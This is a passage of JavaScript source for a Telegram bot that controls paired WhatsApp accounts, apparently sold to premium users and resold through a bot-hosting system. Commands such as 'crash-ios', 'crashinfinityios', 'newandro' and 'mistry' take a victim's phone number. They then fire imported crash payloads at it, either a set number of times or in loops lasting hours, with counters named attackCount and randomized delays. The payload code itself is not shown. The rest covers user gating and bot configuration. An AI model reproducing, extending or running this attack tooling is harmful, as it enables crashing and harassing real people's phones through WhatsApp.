                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})

SYLoVe('crash-ios', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await testlogic.test(client, targetJid);
                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await testlogic.test(client, targetJid);
                attackCount++;
                
                if (attackCount % 4 === 0) {
                    const breakTime = getRandomDelay(8000, 12000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(2000);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

SYLoVe(['mistryios', 'iosnova', 'IosInvisiblex', 'hidenseek'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await IosLogic.IosInvisible(client, targetJid);

                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await IosLogic.IosInvisible(client, targetJid);

attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})


SYLoVe(['mistryios2', 'crashinfinityios1', 'crashinfinityios2', 'crashinfinityios3'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await bahiravaiosLogic.bahiravaios(client, targetJid);

                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await bahiravaiosLogic.bahiravaios(client, targetJid);

attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})

SYLoVe('newandro', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await XLogic.Xdelay(client, targetJid);
await android1Logic.android1(client, targetJid);
await android2Logic.android2(client, targetJid);
await android3Logic.android3(client, targetJid);
await android4Logic.android4(client, targetJid);
await android5Logic.android5(client, targetJid);

                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await XLogic.Xdelay(client, targetJid);
await android1Logic.android1(client, targetJid);
await android2Logic.android2(client, targetJid);
await android3Logic.android3(client, targetJid);
await android4Logic.android4(client, targetJid);
await android5Logic.android5(client, targetJid);

attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})

  SYLoVe('mistry2', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await await bahirava1Logic.bahirava1(client, targetJid);
await android1Logic.android1(client, targetJid);
await android2Logic.android2(client, targetJid);
await android3Logic.android3(client, targetJid);
await android4Logic.android4(client, targetJid);
await android5Logic.android5(client, targetJid);

                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await await bahirava1Logic.bahirava1(client, targetJid);
await android1Logic.android1(client, targetJid);
await android2Logic.android2(client, targetJid);
await android3Logic.android3(client, targetJid);
await android4Logic.android4(client, targetJid);
await android5Logic.android5(client, targetJid);

attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})      
    SYLoVe('mistry', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `❌ Provide a phone number.\nExample: /${s7CM} +999999999999 2`
        );
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {
        const [exists] = await client.onWhatsApp(targetJid);
        if (!exists) {
            return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
        }

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendVideo(chatId, LoveVideo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid count value');
            }

            // Limit count
            const maxCount = Math.min(count, 5);
            
            for (let i = 0; i < maxCount; i++) {
                await await bahirava2Logic.bahirava2(client, targetJid);
await android1Logic.android1(client, targetJid);
await android2Logic.android2(client, targetJid);
await android3Logic.android3(client, targetJid);
await android4Logic.android4(client, targetJid);
await android5Logic.android5(client, targetJid);

                
                if (i < maxCount - 1) {
                    const delayTime = getRandomDelay(5000, 10000);
                    await new Promise(resolve => setTimeout(resolve, delayTime));
                }
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '❌ Invalid time value');
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;
            let attackCount = 0;

            while (Date.now() < endTime) {
                await await bahirava2Logic.bahirava2(client, targetJid);
await android1Logic.android1(client, targetJid);
await android2Logic.android2(client, targetJid);
await android3Logic.android3(client, targetJid);
await android4Logic.android4(client, targetJid);
await android5Logic.android5(client, targetJid);

attackCount++;
                
                if (attackCount % 5 === 0) {
                    const breakTime = getRandomDelay(8000, 15000);
                    await new Promise(resolve => setTimeout(resolve, breakTime));
                } else {
                    await delay(500);
                }
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
})            
        SYLoVe('listprem', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    
    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }
    
    // 🔥 FIX: Convert to number for comparison
    if (Number(chatId) !== Number(config.adminId)) {
        return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
    }

    let db = getDB();
    if (db.premium.length === 0) {
        return S7.sendMessage(chatId, 'No premium users found.');
    }

    let text = 'Premium List:\n\n';

    for (let i = 0; i < db.resellers.length; i++) {
        const id = db.resellers[i].toString();
        try {
            const user = await S7.getChat(id);
            const username = user.username ? `@${user.username} : ` : '';
            text += `${i + 1}. ${username}<code>${id}</code>\n`;
        } catch (e) {
            text += `${i + 1}. \`${id}\`\n`;
        }
    }
    text += '\n──────────────────';

    S7.sendMessage(chatId, text, {
        parse_mode: 'HTML'
    });
});  

        // /groupid lists groups from the current Telegram user's WhatsApp
        // sessions. /listgc is kept as a backwards-compatible alias.
        SYLoVe(['groupid', 'listgc'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(
                    chatId,
                    '❌ No WhatsApp number connected. Please use /reqpair first.'
                );
            }

            const groups = await getUserWhatsAppGroups(chatId);
            if (groups.length === 0) {
                return S7.sendMessage(chatId, '❌ No WhatsApp groups found on your connected numbers.');
            }

            let text = `⬣ <b>YOUR WHATSAPP GROUP IDS</b>\n\n`;
            text += `📦 <b>Total Groups:</b> ${groups.length}\n\n`;

            groups.forEach((group, index) => {
                text += `❏ <b>Group ${index + 1}</b>\n`;
                text += `│⭔ <b>Name:</b> ${escapeTelegramHtml(group.subject)}\n`;
                text += `│⭔ <b>ID:</b> <code>${escapeTelegramHtml(group.id)}</code>\n`;
                text += `│⭔ <b>Number:</b> <code>${escapeTelegramHtml(group.num)}</code>\n`;
                text += `╰──────────────\n\n`;
            });

            if (text.length > 4000) {
                const filePath = path.join(LoveDir, `groupid-${chatId}.txt`);
                fs.writeFileSync(filePath, text.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, filePath, {
                    caption: `✅ ${groups.length} WhatsApp group IDs`
                });
            }

            return S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        // ============================================================
// Bᴀʜɪʀᴀᴠᴀ Bᴏᴛ Hᴏsᴛɪɴɢ Sʏsᴛᴇᴍ
// SᴇᴛBᴏᴛ / AᴅᴅBᴏᴛ / DᴇʟBᴏᴛ
// ============================================================

// ==================== Hᴛᴍʟ Eꜱᴄᴀᴘᴇ ====================

function escapeHTML(text = '') {
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}


// ==================== Fɪɴᴅ Hᴏsᴛᴇᴅ Bᴏᴛ ====================

function getHostedBot(db, ownerId) {
    return db.tokens.find(
        bot => String(bot.owner) === String(ownerId)
    );
}


// ==================== SᴇᴛBᴏᴛ Hᴇʟᴘ ====================

function setBotHelp() {
    return `
╭━━━〔 ⚙️ Bᴏᴛ Sᴇᴛᴛɪɴɢs 〕━━━╮
┃
┃ 🎨 <b>Bʀᴀɴᴅɪɴɢ</b>
┃
┃ <code>/setbot name My Bot</code>
┃ <code>/setbot video</code>
┃ <code>/setbot channel https://t.me/channel</code>
┃ <code>/setbot group https://t.me/group</code>
┃ <code>/setbot contact @username</code>
┃
┃ 🛡️ <b>Pʀᴏᴛᴇᴄᴛɪᴏɴ</b>
┃
┃ <code>/setbot protection on</code>
┃ <code>/setbot protection off</code>
┃
┃ 🆔 <b>Cʜᴀᴛ ID</b>
┃
┃ <code>/setbot channelid -100xxxxxxxxxx</code>
┃ <code>/setbot groupid -100xxxxxxxxxx</code>
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

🎬 <b>Vɪᴅᴇᴏ Sᴇᴛᴜᴘ</b>

Sᴇɴᴅ ᴀ ᴠɪᴅᴇᴏ ᴡɪᴛʜ:
<code>/setbot video</code>

Oʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴠɪᴅᴇᴏ ᴡɪᴛʜ:
<code>/setbot video</code>
`;
}


// ============================================================
// SᴇᴛBᴏᴛ
// ============================================================

SYLoVe('setbot', async (msg) => {

    const chatId = String(msg.chat.id);

    try {

        let db = getDB();

        // ==================== Fɪɴᴅ Bᴏᴛ ====================

        const botData = db.tokens.find(
            bot => String(bot.owner) === chatId
        );

        if (!botData) {

            return S7.sendMessage(
                chatId,
                `
╭━━━〔 ❌ Eʀʀᴏʀ 〕━━━╮
┃
┃ Nᴏ ʜᴏsᴛᴇᴅ ʙᴏᴛ ғᴏᴜɴᴅ.
┃
╰━━━━━━━━━━━━━━━━━━╯

Yᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀ ʜᴏsᴛᴇᴅ ʙᴏᴛ.

Uꜱᴇ:
<code>/addbot YOUR_TOKEN</code>
`,
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Pᴀʀꜱᴇ Cᴏᴍᴍᴀɴᴅ ====================

        const messageText = (
            msg.text ||
            msg.caption ||
            ''
        ).trim();

        const args = messageText.split(/\s+/);

        const type = args[1]?.toLowerCase();

        let value = args
            .slice(2)
            .join(' ')
            .trim();


        // ==================== Vɪᴅᴇᴏ Fʀᴏᴍ Vɪᴅᴇᴏ ====================

        if (
            type === 'video' &&
            msg.video
        ) {

            value = msg.video.file_id;
        }


        // ==================== Vɪᴅᴇᴏ Fʀᴏᴍ Rᴇᴘʟʏ ====================

        if (
            type === 'video' &&
            msg.reply_to_message?.video
        ) {

            value = msg.reply_to_message.video.file_id;
        }


        // ==================== Sʜᴏᴡ Hᴇʟᴘ ====================

        if (!type) {

            return S7.sendMessage(
                chatId,
                setBotHelp(),
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Cᴏɴғɪɢ ====================

        if (!botData.config) {
            botData.config = {};
        }


        // ====================================================
        // Nᴀᴍᴇ
        // ====================================================

        if (type === 'name') {

            if (!value) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Nᴀᴍᴇ Nᴏᴛ Pʀᴏᴠɪᴅᴇᴅ</b>

Exᴀᴍᴘʟᴇ:
<code>/setbot name Bᴀʜɪʀᴀᴠᴀ Bᴏᴛ</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            if (value.length > 64) {

                return S7.sendMessage(
                    chatId,
                    '❌ Bᴏᴛ ɴᴀᴍᴇ ᴍᴜsᴛ ʙᴇ 64 ᴄʜᴀʀᴀᴄᴛᴇʀs ᴏʀ ʟᴇss.',
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.botName = value;
        }


        // ====================================================
        // Vɪᴅᴇᴏ
        // ====================================================

        else if (type === 'video') {

            if (!value) {

                return S7.sendMessage(
                    chatId,
                    `
╭━━━〔 🎬 Vɪᴅᴇᴏ Sᴇᴛᴜᴘ 〕━━━╮
┃
┃ Sᴇɴᴅ ᴀ ᴠɪᴅᴇᴏ ᴡɪᴛʜ:
┃ <code>/setbot video</code>
┃
┃ Oʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴠɪᴅᴇᴏ:
┃ <code>/setbot video</code>
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
`,
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.video = value;
        }


        // ====================================================
        // Cʜᴀɴɴᴇʟ
        // ====================================================

        else if (type === 'channel') {

            if (!value) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Cʜᴀɴɴᴇʟ Lɪɴᴋ Mɪssɪɴɢ</b>

Exᴀᴍᴘʟᴇ:
<code>/setbot channel https://t.me/yourchannel</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            if (
                !value.startsWith('https://t.me/') &&
                !value.startsWith('http://t.me/') &&
                !value.startsWith('@')
            ) {

                return S7.sendMessage(
                    chatId,
                    '❌ Pʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ Tᴇʟᴇɢʀᴀᴍ ᴄʜᴀɴɴᴇʟ ʟɪɴᴋ.',
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.channel = value;
        }


        // ====================================================
        // Gʀᴏᴜᴘ
        // ====================================================

        else if (type === 'group') {

            if (!value) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Gʀᴏᴜᴘ Lɪɴᴋ Mɪssɪɴɢ</b>

Exᴀᴍᴘʟᴇ:
<code>/setbot group https://t.me/yourgroup</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            if (
                !value.startsWith('https://t.me/') &&
                !value.startsWith('http://t.me/') &&
                !value.startsWith('@')
            ) {

                return S7.sendMessage(
                    chatId,
                    '❌ Pʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ Tᴇʟᴇɢʀᴀᴍ ɢʀᴏᴜᴘ ʟɪɴᴋ.',
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.group = value;
        }


        // ====================================================
        // Cᴏɴᴛᴀᴄᴛ
        // ====================================================

        else if (type === 'contact') {

            if (!value) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Cᴏɴᴛᴀᴄᴛ Mɪssɪɴɢ</b>

Exᴀᴍᴘʟᴇ:
<code>/setbot contact @Butterfly_crack</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.ownerContact = value;
        }


        // ====================================================
        // Pʀᴏᴛᴇᴄᴛɪᴏɴ
        // ====================================================

        else if (type === 'protection') {

            const state =
                value.toLowerCase();

            if (
                state !== 'on' &&
                state !== 'off'
            ) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Iɴᴠᴀʟɪᴅ Pʀᴏᴛᴇᴄᴛɪᴏɴ Sᴛᴀᴛᴇ</b>

Uꜱᴇ:

<code>/setbot protection on</code>

Oʀ

<code>/setbot protection off</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.protectionState =
                state === 'on';
        }


        // ====================================================
        // Cʜᴀɴɴᴇʟ ID
        // ====================================================

        else if (type === 'channelid') {

            if (!/^-100\d+$/.test(value)) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Iɴᴠᴀʟɪᴅ Cʜᴀɴɴᴇʟ ID</b>

Exᴀᴍᴘʟᴇ:
<code>-1001234567890</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.channelId = value;
        }


        // ====================================================
        // Gʀᴏᴜᴘ ID
        // ====================================================

        else if (type === 'groupid') {

            if (!/^-100\d+$/.test(value)) {

                return S7.sendMessage(
                    chatId,
                    `
❌ <b>Iɴᴠᴀʟɪᴅ Gʀᴏᴜᴘ ID</b>

Exᴀᴍᴘʟᴇ:
<code>-1001234567890</code>
`,
                    { parse_mode: 'HTML' }
                );
            }

            botData.config.groupId = value;
        }


        // ====================================================
        // Iɴᴠᴀʟɪᴅ
        // ====================================================

        else {

            return S7.sendMessage(
                chatId,
                `
❌ <b>Iɴᴠᴀʟɪᴅ Sᴇᴛᴛɪɴɢ</b>

Sᴇᴛᴛɪɴɢ:
<code>${escapeHTML(type)}</code>

${setBotHelp()}
`,
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Sᴀᴠᴇ ====================

        saveDB(db);


        // ==================== Uᴘᴅᴀᴛᴇᴅ ====================

        await S7.sendMessage(
            chatId,
            `
╭━━━〔 ✅ Bᴏᴛ Uᴘᴅᴀᴛᴇᴅ 〕━━━╮
┃
┃ ⚙️ Sᴇᴛᴛɪɴɢ:
┃ <code>${escapeHTML(type)}</code>
┃
┃ 🤖 Bᴏᴛ:
┃ ${escapeHTML(
                botData.config.botName ||
                'Hᴏsᴛᴇᴅ Bᴏᴛ'
            )}
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

💾 Cᴏɴғɪɢᴜʀᴀᴛɪᴏɴ sᴀᴠᴇᴅ.

🔄 Rᴇsᴛᴀʀᴛɪɴɢ Bᴏᴛ...
`,
            { parse_mode: 'HTML' }
        );


        // ==================== Sᴛᴏᴘ Oʟᴅ Bᴏᴛ ====================

        if (activeBots[botData.token]) {

            try {

                await activeBots[
                    botData.token
                ].stopPolling();

            } catch (error) {

                console.log(
                    '[SᴇᴛBᴏᴛ] Sᴛᴏᴘ Eʀʀᴏʀ:',
                    error.message
                );
            }

            delete activeBots[
                botData.token
            ];
        }


        // ==================== Rᴇsᴛᴀʀᴛ ====================

        await new Promise(
            resolve => setTimeout(resolve, 1000)
        );

        try {

            startSYloveBot(
                botData.token
            );

            await S7.sendMessage(
                chatId,
                `
╭━━━〔 🟢 Bᴏᴛ Oɴʟɪɴᴇ 〕━━━╮
┃
┃ ✅ Cᴏɴғɪɢᴜʀᴀᴛɪᴏɴ Aᴘᴘʟɪᴇᴅ
┃
┃ 🤖 Bᴏᴛ Rᴇsᴛᴀʀᴛᴇᴅ
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
`,
                { parse_mode: 'HTML' }
            );

        } catch (error) {

            console.error(
                '[SᴇᴛBᴏᴛ] Rᴇsᴛᴀʀᴛ Eʀʀᴏʀ:',
                error
            );

            await S7.sendMessage(
                chatId,
                `
⚠️ <b>Cᴏɴғɪɢᴜʀᴀᴛɪᴏɴ Sᴀᴠᴇᴅ</b>

Bᴜᴛ ᴛʜᴇ ʙᴏᴛ ᴄᴏᴜʟᴅ ɴᴏᴛ ʙᴇ ʀᴇsᴛᴀʀᴛᴇᴅ.

Eʀʀᴏʀ:
<code>${escapeHTML(error.message)}</code>
`,
                { parse_mode: 'HTML' }
            );
        }

    } catch (error) {

        console.error(
            '[SᴇᴛBᴏᴛ Eʀʀᴏʀ]',
            error
        );

        S7.sendMessage(
            chatId,
            `
❌ <b>Uɴᴇxᴘᴇᴄᴛᴇᴅ Eʀʀᴏʀ</b>

<code>${escapeHTML(
                error.message
            )}</code>
`,
            { parse_mode: 'HTML' }
        );
    }
});


// ============================================================
// AᴅᴅBᴏᴛ
// ============================================================

SYLoVe('addbot', async (msg) => {

    const chatId = String(msg.chat.id);

    try {

        let db = getDB();


        // ==================== Lɪᴍɪᴛ ====================

        const userBots =
            db.tokens.filter(
                bot =>
                    String(bot.owner) === chatId
            );

        if (userBots.length >= 1) {

            return S7.sendMessage(
                chatId,
                `
╭━━━〔 ⚠️ Hᴏsᴛɪɴɢ Lɪᴍɪᴛ 〕━━━╮
┃
